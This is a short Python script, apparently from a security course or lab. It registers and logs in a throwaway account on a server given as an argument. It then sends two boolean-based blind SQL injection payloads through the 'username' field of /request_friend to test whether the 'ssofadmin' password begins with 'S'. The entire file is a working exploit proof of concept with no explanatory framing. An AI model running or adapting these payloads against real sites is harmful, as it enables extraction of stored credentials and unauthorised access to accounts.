import requests, sys, random

SERVER = sys.argv[1]
session = requests.session()

user = str(random.randint(2**27, 2**28))
password = str(random.randint(2**27, 2**28))

params = {'password' : password, 'username' : user}
r = session.post(SERVER + '/register', data=params)

params = {'password' : password, 'username' : user}
r = session.post(SERVER + '/login', data=params, cookies=session.cookies)

assert user in r.text

QUERY1 = "ssofadmin' AND password LIKE BINARY 'S%' AND '1'='0' #"
QUERY2 = "ssofadmin' AND password LIKE BINARY 'S%' AND '1'='1' #"

params = {'username': QUERY1}
r1 = session.post(SERVER + "/request_friend", data=params, cookies=session.cookies)

params = {'username': QUERY2}
r2 = session.post(SERVER + "/request_friend", data=params, cookies=session.cookies)

assert r1.status_code != r2.status_code
